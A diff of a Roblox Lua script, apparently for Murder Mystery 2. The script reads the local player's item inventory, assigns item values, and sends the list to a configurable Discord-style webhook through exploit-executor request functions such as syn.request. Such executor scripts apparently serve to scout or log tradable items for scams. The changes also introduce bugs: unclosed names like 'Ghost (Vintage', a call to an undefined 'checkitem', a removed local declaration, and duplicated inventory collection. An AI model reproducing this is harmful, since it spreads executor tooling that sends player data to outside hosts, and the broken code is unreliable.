@@ -10,8 +10,7 @@ local LocalPlayer = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 local Inventory = {}
 
-local UIPath
-if LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Inventory") then
+if LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Inventory") ~= nil then
     UIPath = LocalPlayer.PlayerGui.MainGUI.Game.Inventory.Main
 else
     UIPath = LocalPlayer.PlayerGui.MainGUI.Lobby.Screens.Inventory.Main
@@ -34,16 +33,16 @@ local ItemValues = {
     ["Icewing"] = 4,
 
     -- Vintages
-    ["Ghost"] = 14,
-    ["America"] = 11,
-    ["Blood"] = 11,
+    ["Ghost (Vintage"] = 14,
+    ["America (Vintage"] = 11,
+    ["Blood (Vintage"] = 11,
     ["Laser (Vintage)"] = 10,
-    ["Phaser"] = 10,
-    ["Shadow"] = 8,
-    ["Prince"] = 7,
-    ["Cowboy"] = 5,
-    ["Golden"] = 5,
-    ["Splitter"] = 4,
+    ["Phaser (Vintage"] = 10,
+    ["Shadow (Vintage"] = 8,
+    ["Prince (Vintage"] = 7,
+    ["Cowboy (Vintage"] = 5,
+    ["Golden (Vintage"] = 5,
+    ["Splitter (Vintage"] = 4,
 
     -- Godlies
     ["C. Traveler's Gun"] = 78033,
@@ -175,23 +174,23 @@ local ItemValues = {
 
     -- Legendary
     ["Latte (Gun)"] = 144,
-    ["Latte (Knife)"] = 144,
+    ["Latte"] = 144,
     ["Cotton Candy"] = 89,
     ["JD"] = 89,
     ["Witched"] = 75,
-    ["Cavern (Knife)"] = 30,
+    ["Cavern"] = 30,
     ["Beach"] = 16,
     ["Green Elite"] = 14,
     ["Icedriller"] = 14,
     ["Skulls"] = 14,
-    ["Cursed (Knife)"] = 11,
+    ["Cursed"] = 11,
     ["Blue Elite"] = 10,
     ["Ginger (Gun)"] = 10,
     ["Santa's Magic"] = 10,
     ["Santa's Spirit"] = 10,
     ["Vampire (Gun)"] = 8,
-    ["Ghost (Knife)"] = 8,
-    ["Spectral (Knife)"] = 7,
+    ["Ghost"] = 8,
+    ["Spectral"] = 7,
     ["Aurora (Gun)"] = 5,
     ["Red Scratch"] = 5,
     ["Traveler (Gun)"] = 4,
@@ -200,21 +199,23 @@ local ItemValues = {
     ["Red Fire"] = 4,
     ["Cursed (Gun)"] = 3,
     ["Arctic (Gun)"] = 3,
-    ["Frostfade (Knife)"] = 3,
+    ["Frostfade"] = 3,
     ["Icecracker"] = 3,
     ["Ghost (Gun)"] = 3,
     ["Rupture"] = 1,
     ["Tree (Gun)"] = 1,
-    ["Tree (Knife)"] = 1,
+    ["Tree"] = 1,
     ["Web"] = 1,
     ["Cavern (Gun)"] = 1,
 }
+    
 
 -- Function to format and add item to inventory list
 local function checkItem(itemFrame)
     if itemFrame:IsA("Frame") then
         local itemName = itemFrame.ItemName.Label.Text
-        if itemName ~= "Default Knife" and itemName ~= "Default Gun" then
+        -- Ensure itemName exists in ItemValues to avoid adding invalid items
+        if itemName ~= "Default Knife" and itemName ~= "Default Gun" and ItemValues[itemName] then
             if Config.FullInventory then
                 local number = itemFrame.Container.Amount.Text ~= "" and itemFrame.Container.Amount.Text or "x1"
                 local itemValue = ItemValues[itemName] or "Trash"
@@ -225,27 +226,21 @@ local function checkItem(itemFrame)
     end
 end
 
--- Function to gather all items from UI and format inventory
-local function gatherInventory()
-    -- Weapons Items
-    for _, weaponCategory in pairs(UIPath.Weapons.Items.Container:GetChildren()) do
-        for _, weapon in pairs(weaponCategory.Container:GetChildren()) do
-            if weapon.Name == "Christmas" or weapon.Name == "Halloween" then
-                for _, specialItem in pairs(weapon.Container:GetChildren()) do
-                    checkItem(specialItem)
+
+local function FullInventory()
+    for _, v in pairs(UIPath.Weapons.Items.Container:GetChildren()) do
+        for _, v in pairs(v.Container:GetChildren()) do
+            if v.Name == "Christmas" or v.Name == "Halloween" then
+                for _, v in pairs(v.Container:GetChildren()) do
+                    checkitem(v)
                 end
             else
-                checkItem(weapon)
+                checkitem(v)
             end
         end
     end
 
-    -- Pets Items
-    for _, petItem in pairs(UIPath.Pets.Items.Container.Current.Container:GetChildren()) do
-        checkItem(petItem)
-    end
-
-    -- Format inventory list into bullet points
+    -- Format inventory list as bullet points
     local formattedInventory = {}
     for _, item in ipairs(Inventory) do
         table.insert(formattedInventory, "- " .. item)
@@ -253,32 +248,18 @@ local function gatherInventory()
     return table.concat(formattedInventory, "\n")
 end
 
--- Gather and format the inventory
-local inventoryData = gatherInventory()
+FullInventory()
 
--- Send formatted inventory to Discord
+task.wait()
+
 local data = {
-    content = inventoryData
+    content = FullInventory()
 }
 
--- Define the request function and handle errors
-local function sendToWebhook(data)
-    local request = http_request or request or HttpPost or syn.request
-    local success, response = pcall(function()
-        return request({
-            Url = Config.Webhook,
-            Method = "POST",
-            Headers = { ["Content-Type"] = "application/json" },
-            Body = HttpService:JSONEncode(data)
-        })
-    end)
-
-    if not success then
-        warn("Failed to send inventory to webhook: " .. response)
-    else
-        print("Inventory successfully sent to webhook.")
-    end
-end
-
--- Send the data to the webhook
-sendToWebhook(data)
+local request = http_request or request or HttpPost or syn.request
+request({
+    Url = Config.Webhook,
+    Method = "POST",
+    Headers = { ["Content-Type"] = "application/json" },
+    Body = HttpService:JSONEncode(data)
+})
